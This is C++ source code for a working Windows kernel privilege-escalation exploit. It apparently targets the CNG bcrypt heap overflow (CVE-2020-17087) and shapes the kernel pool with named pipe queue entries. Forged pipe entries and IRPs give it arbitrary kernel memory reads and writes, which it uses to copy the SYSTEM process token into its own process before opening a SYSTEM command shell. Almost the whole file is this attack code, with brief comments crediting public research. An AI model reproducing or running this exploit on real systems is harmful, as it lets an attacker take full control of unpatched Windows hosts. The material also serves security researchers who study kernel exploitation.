#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <winternl.h>
#include <vector>

#pragma comment(lib, "Bcrypt.lib")

#pragma optimize("", off)

#define DATA_ENTRY_HEADER_SIZE 0x30
#define BCRYPT_VULNERABLE_CHUNK_SIZE 0x8d2
#define VICTIM_FIRST_ENTRY_SIZE 0x2d0
#define VICTIM_SECOND_ENTRY_SIZE 0x4000
#define VICTIM_PIPES_NUMBER 10000
#define WARMUP_NUMBER 48
#define USERSPACE_ADDRESS ((uint64_t)(VICTIM_SECOND_ENTRY_SIZE-DATA_ENTRY_HEADER_SIZE)<<32)
#define ARBITRARY_WRITE_SIZE 8

#define assert(e) do {if(!(e)){printf("Assertion failed at line %d: %s\n", __LINE__ , #e);Sleep(-1);}} while(0)
#define KERNELSPACE_ADDRESS(x) (((x)>>48)==0xffff)
#define ENTRY_DATASIZE(x) ((x)-DATA_ENTRY_HEADER_SIZE)
#define COVER_BUFFER_SIZE 0x10000
#define SCRATCH_BUFFER_SIZE 0x100000

#define VICTIM_TOTAL_DATASIZE (ENTRY_DATASIZE(VICTIM_FIRST_ENTRY_SIZE)+ENTRY_DATASIZE(VICTIM_SECOND_ENTRY_SIZE))
#define BCRYPT_ORIGINAL_REQUEST_SIZE  ((0x10000+BCRYPT_VULNERABLE_CHUNK_SIZE)/6) 

#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

using namespace std;


typedef void (IO_APC_ROUTINE)(
    void* ApcContext,
    IO_STATUS_BLOCK* IoStatusBlock,
    unsigned long    reserved
    );

typedef int(__stdcall* NTFSCONTROLFILE)(
    HANDLE           fileHandle,
    HANDLE           event,
    IO_APC_ROUTINE* apcRoutine,
    void* ApcContext,
    IO_STATUS_BLOCK* ioStatusBlock,
    unsigned long    FsControlCode,
    void* InputBuffer,
    unsigned long    InputBufferLength,
    void* OutputBuffer,
    unsigned long    OutputBufferLength
    );

typedef struct {
    SHORT Type;
    USHORT Size;
    PVOID MdlAddress;
    ULONG Flags;
    PVOID AssociatedIrp;
    LIST_ENTRY ThreadListEntry;
    IO_STATUS_BLOCK IoStatus;
    CHAR RequestorMode;
    BOOLEAN PendingReturned;
    CHAR StackCount;
    CHAR CurrentLocation;
    BOOLEAN Cancel;
    UCHAR CancelIrql;
    CCHAR ApcEnvironment;
    UCHAR AllocationFlags;
    PVOID UserIosb;
    PVOID UserEvent;
    char Overlay[16];
    PVOID CancelRoutine;
    PVOID UserBuffer;
    CHAR TailIsWrong;
} IRP;

typedef struct {
    uint64_t Flink;
    uint64_t Blink;
    IRP* Irp;
    uint64_t SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
} DATA_QUEUE_ENTRY;

typedef struct {
    HANDLE r;
    HANDLE w;
} PIPE_HANDLES;

enum {
    EPROCESS_PID = 0, EPROCESS_TOKEN, EPROCESS_THREADLISTHEAD
};

//EPROCESS offsets to target 1709+
uint64_t c_offsets[][3] = {
    {0x2e0, 0x358, 0x488},
    {0x440, 0x4b8, 0x5e0}
};

int g_setoff = 0;
PIPE_HANDLES* g_victim_pipe = 0;
char* g_buf;

//originally g_cover_pipe_data was meant to hold the forged data entry in case the overflow redirected the flink within the "first entries"
//didn't use it at the end, too much hassle for its benefits.
char* g_cover_pipe_data;

void CreatePipe(PIPE_HANDLES* ph, uint32_t quota = -1) {
    ph->w = CreateNamedPipe(
        L"\\\\.\\pipe\\exploit_cng",
        PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        quota,
        quota,
        0,
        0);
    ph->r = CreateFile(L"\\\\.\\pipe\\exploit_cng", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
}

void WriteDataEntry(PIPE_HANDLES ph, uint32_t len) {
    WriteFile(ph.w,
        g_cover_pipe_data,
        ENTRY_DATASIZE(len),
        NULL,
        NULL);
}

void ReadDataEntry(PIPE_HANDLES ph, uint32_t len) {
    ReadFile(ph.r,
        g_buf,
        ENTRY_DATASIZE(len),
        NULL,
        NULL);
}

//use BCryptSetContextFunctionProperty instead of interacting directly with cng
//as described in: https://ch3rn0byl.com/2021/02/a-look-at-cve-2020-17087/
void BcryptCall(size_t sz) {
    BCryptSetContextFunctionProperty(
        CRYPT_LOCAL,
        L"Default",
        BCRYPT_CIPHER_INTERFACE,
        L"AES",
        L"Property",
        sz,
        (PUCHAR)g_buf
    );
}

/*
Copied from:
https://github.com/synacktiv/Windows-kernel-SegmentHeap-Aligned-Chunk-Confusion/blob/master/GenericExploit/src/poc_exploit.c#L60
*/
void EnableLookaside(int chunk_size) {
    static PIPE_HANDLES ph = { 0,0 };
    if (!ph.w)
        CreatePipe(&ph);

    for (int i = 0; i < 0x10000; i++) {
        WriteDataEntry(ph, chunk_size);
    }
    Sleep(2000);


    for (int i = 0; i < 0x10000; i++) {
        WriteDataEntry(ph, chunk_size);
    }
    Sleep(1000);


    for (int i = 0; i < 0x100; i++) {
        WriteDataEntry(ph, chunk_size);
    }
}

void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->EntryType = 1;
    dqe->DataSize = -1;
    dqe->Irp = irp;
    irp->AssociatedIrp = (PVOID)read_address;
}

void PrepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) {
    irp->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    irp->AssociatedIrp = source_address;
    irp->UserBuffer = destination_address;
    irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
    irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void PrepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint32_t size) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->Flink = (uint64_t)dqe;
    dqe->EntryType = 0;
    dqe->QuotaInEntry = size - 1;
    dqe->DataSize = size;
    dqe->Irp = irp;
}


DWORD WINAPI ThreadedWriter(void* arg) {
    char* buf = (char*)arg;
    DWORD res;

    WriteDataEntry(*g_victim_pipe, 0x100); //we should have already reached the quota, any value that creates an entry should work (~>0x40)

    Sleep(-1);
    return 0;
}

void ReadMem(uint64_t addr, size_t len, char* data) {
    static char* buf = (char*)malloc(VICTIM_TOTAL_DATASIZE + 1 + 0x5000);
    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USERSPACE_ADDRESS;
    DWORD read;

    assert(len < 0x5000);

    PrepareDataEntryForRead(dqe, (IRP*)(USERSPACE_ADDRESS + 0x1000), addr);
    PeekNamedPipe(g_victim_pipe->r, buf, VICTIM_TOTAL_DATASIZE + 1 + len, &read, 0, 0);
    memcpy(data, buf + VICTIM_TOTAL_DATASIZE + 1, len);
}

uint64_t GetProcessById(uint64_t first_process, uint64_t pid) {
    uint64_t current_pid = 0;
    uint64_t current_process = first_process;
    while (1) {
        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&current_pid);
        if (current_pid == pid)
            return current_process;

        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID] + 8, 8, (char*)&current_process);
        current_process -= c_offsets[g_setoff][EPROCESS_PID] + 8;

        if (current_process == first_process)
            return 0;
    }
}

int main() {
    PIPE_HANDLES spare_pipe, subsegments_pipe, bcrypt_pipe, victim_pipes[VICTIM_PIPES_NUMBER];;
    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
    DWORD res;
    IO_STATUS_BLOCK isb;

    if (VirtualAlloc((PVOID)USERSPACE_ADDRESS, 0x5000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USERSPACE_ADDRESS) {
        printf("Couldn't allocate base address %p\n", USERSPACE_ADDRESS);
        return 0;
    }

    g_buf = (char*)malloc(SCRATCH_BUFFER_SIZE);
    g_cover_pipe_data = (char*)malloc(COVER_BUFFER_SIZE);

    for (int i = 0; i < sizeof(victim_pipes) / sizeof(*victim_pipes); i++) {
        CreatePipe(&victim_pipes[i], VICTIM_TOTAL_DATASIZE);
    }

    CreatePipe(&spare_pipe);
    CreatePipe(&subsegments_pipe);
    CreatePipe(&bcrypt_pipe);

    printf("[*] Draining the FreeChunkTree\n");
    for (int i = 0; i < 100000; i++) {
        WriteDataEntry(spare_pipe, 0x1f0);
    }

    printf("[*] Injecting the VS allocator with big subsegments\n");
    for (int i = 0; i < 10; i++) {
        WriteDataEntry(subsegments_pipe, 0x8e20);
    }

    for (int i = 0; i < 10; i++) {
        ReadDataEntry(subsegments_pipe, 0x8e20);
    }

    printf("[*] Warming up for the allocation of vulnerable chunk\n");
    for (int i = 0; i < WARMUP_NUMBER; i++)
        WriteDataEntry(spare_pipe, BCRYPT_VULNERABLE_CHUNK_SIZE);

    printf("[*] Allocating the vulnerable chunk\n");
    WriteDataEntry(bcrypt_pipe, BCRYPT_VULNERABLE_CHUNK_SIZE);

    printf("[*] Writing the victim entries\n");
    for (int i = 0; i < VICTIM_PIPES_NUMBER; i++)
        WriteDataEntry(victim_pipes[i], VICTIM_FIRST_ENTRY_SIZE);

    printf("[*] Setting up the undercover entry\n");
    DATA_QUEUE_ENTRY undercover_entry = {
    USERSPACE_ADDRESS, 0,
    (IRP*)USERSPACE_ADDRESS, 0,
    0, ENTRY_DATASIZE(VICTIM_SECOND_ENTRY_SIZE) + 1, ENTRY_DATASIZE(VICTIM_SECOND_ENTRY_SIZE) + 1, 0
    };

    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)g_cover_pipe_data;
    memset(g_cover_pipe_data, 0, VICTIM_SECOND_ENTRY_SIZE);
    memcpy(g_cover_pipe_data, &undercover_entry.Irp, sizeof(DATA_QUEUE_ENTRY) - offsetof(DATA_QUEUE_ENTRY, Irp));
    for (int chunk_offset = 0x1000 - DATA_ENTRY_HEADER_SIZE + 0x20; chunk_offset < COVER_BUFFER_SIZE - sizeof(DATA_QUEUE_ENTRY); chunk_offset += 0x1000) {
        memcpy(g_cover_pipe_data + chunk_offset, &undercover_entry, sizeof(DATA_QUEUE_ENTRY));
    }

    ((IRP*)dqe)->CancelRoutine = 0;

    //making sure we will land on the undercover entry, babushka entries
    for (int i = 0; i < 3000; i++) {
        WriteDataEntry(spare_pipe, VICTIM_SECOND_ENTRY_SIZE);
    }

    //cover entries could end up being babushka entries as well
    printf("[*] Writing the cover entries\n");
    for (int i = 0; i < VICTIM_PIPES_NUMBER; i++) {
        WriteDataEntry(victim_pipes[i], VICTIM_SECOND_ENTRY_SIZE);
    }

    //some more babushka entries
    for (int i = 0; i < 1000; i++) {
        WriteDataEntry(spare_pipe, VICTIM_SECOND_ENTRY_SIZE);
    }

    printf("[*] Enabling the dynamic lookaside for the bucket of the vulnerable chunk\n");
    EnableLookaside(BCRYPT_VULNERABLE_CHUNK_SIZE);

    printf("[*] Freeing the vulnerable chunk and triggering the overflow\n");
    ReadDataEntry(bcrypt_pipe, BCRYPT_VULNERABLE_CHUNK_SIZE);
    BcryptCall(BCRYPT_ORIGINAL_REQUEST_SIZE);
    WriteDataEntry(spare_pipe, BCRYPT_VULNERABLE_CHUNK_SIZE);

    printf("[*] Identifying the victim entry\n");
    DWORD read;
    for (int i = 0; i < VICTIM_PIPES_NUMBER; i++) {
        PeekNamedPipe(victim_pipes[VICTIM_PIPES_NUMBER - i - 1].r, g_buf, VICTIM_TOTAL_DATASIZE + 1, &read, 0, 0);
        if (read == VICTIM_TOTAL_DATASIZE + 1) {
            g_victim_pipe = &victim_pipes[VICTIM_PIPES_NUMBER - i - 1];
            break;
        }
    }


    uint64_t current_entry_addr, current_entry_flink, previous_entry_addr, previous_entry_flink, next_entry_flink, next_entry_addr;

    for (int i = 0; i < ENTRY_DATASIZE(VICTIM_SECOND_ENTRY_SIZE); i += 8) {
        if (KERNELSPACE_ADDRESS(*(uint64_t*)(g_buf + i))) {
            next_entry_flink = *(uint64_t*)(g_buf + i);
            break;
        }
    }

    assert(next_entry_flink != 0);

    ReadMem(next_entry_flink + 8, 8, (char*)&next_entry_addr);
    assert(KERNELSPACE_ADDRESS(next_entry_addr));

    for (current_entry_addr = next_entry_addr - VICTIM_SECOND_ENTRY_SIZE; current_entry_addr < (next_entry_addr + 0xffff) / 0x10000 * 0x10000; current_entry_addr += VICTIM_SECOND_ENTRY_SIZE) {
        ReadMem(current_entry_addr + 8, 8, (char*)&previous_entry_addr);
        if (!KERNELSPACE_ADDRESS(previous_entry_addr))
            continue;

        ReadMem(previous_entry_addr, 8, (char*)&previous_entry_flink);

        if (KERNELSPACE_ADDRESS(previous_entry_flink) && previous_entry_flink % 0x10000 == 0x0020)
            break;
    }

    assert(KERNELSPACE_ADDRESS(previous_entry_flink) && previous_entry_flink % 0x10000 == 0x0020);
    printf("[*] Address of cover entry: %p\n", current_entry_addr);

    printf("[*] Creating an entry with size greater than the available pipe quota\n");
    CreateThread(0, 0, ThreadedWriter, g_buf, 0, 0);  //we could have used overlapped/completion routines
    Sleep(2000);

    uint64_t next_entry, irp_addr;
    ReadMem(current_entry_addr, 8, (char*)&next_entry);
    printf("[*] Address of created entry: %p\n", next_entry);

    ReadMem(next_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&irp_addr);
    printf("[*] Created entry IRP: %p\n", irp_addr);

    char irp_data[0x1000];
    ReadMem(irp_addr, 0x1000, irp_data);
    IRP* irp = (IRP*)irp_data;

    uint64_t cp_thread_list_head, current_process, current_process_id, system_process;

    //&((ETHREAD*)0)->ThreadListHead.Flink-&((EHREAD)*0)->IrpList=0x38, remains constant between most recent builds
    ReadMem((uint64_t)irp->ThreadListEntry.Flink + 0x38, 8, (char*)&cp_thread_list_head);
    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];
    ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&current_process_id);
    if (current_process_id != GetCurrentProcessId())
        g_setoff++;

    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];

    system_process = GetProcessById(current_process, 4);
    printf("[*] Found current process: %p system process: %p\n", current_process, system_process);
    assert(system_process!=0);

    uint64_t thread_list[2];
    PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + c_offsets[g_setoff][EPROCESS_TOKEN]), (PVOID)(current_process + c_offsets[g_setoff][EPROCESS_TOKEN]));

    NtFsControlFile(g_victim_pipe->w, 0, 0, 0, &isb, 0x119FF8, irp, 0x1000, 0, 0);

    uint64_t unbuffered_entry, unbuffered_irp_addr, forged_irp_addr;
    ReadMem(next_entry, 8, (char*)&unbuffered_entry);
    printf("[*] Data entry that holds the forged IRP: %p\n", unbuffered_entry);

    ReadMem(unbuffered_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&unbuffered_irp_addr);
    printf("[*] Data entry IRP address: %p\n", unbuffered_irp_addr);

    ReadMem(unbuffered_irp_addr + offsetof(IRP, AssociatedIrp), 8, (char*)&forged_irp_addr);

    printf("[*] Forged IRP address: %p\n", forged_irp_addr);
    dqe = (DATA_QUEUE_ENTRY*)USERSPACE_ADDRESS;
    PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE);

    thread_list[0] = thread_list[1] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);

    printf("[*] Triggering a call to IofCompleteRequest with the forged IRP\n\n");
    ReadFile(g_victim_pipe->r, g_buf, 1, &res, 0);
    Sleep(200);

    system("cmd");

    return 0;
}